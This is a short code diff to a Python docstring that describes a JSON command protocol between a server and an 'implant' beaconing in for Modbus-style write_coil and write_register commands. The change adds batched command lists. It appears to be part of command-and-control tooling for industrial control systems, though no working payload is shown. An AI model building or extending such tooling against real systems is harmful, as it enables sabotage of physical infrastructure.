@@ -17,6 +17,9 @@ Protocol: one JSON line per direction, newline-terminated.
   here -> implant:  {"cmd": null}
                      | {"cmd": {"action": "write_coil"|"write_register",
                                 "address": int, "value": ...}}
+                     | {"cmd": [{"action": ..., ...}, {"action": ..., ...}]}
+This side never looks inside "cmd" - whatever was queued (a single object
+or a list, see beacon_client.py's execute()) is handed out byte-for-byte.
 """
 import argparse
 import asyncio
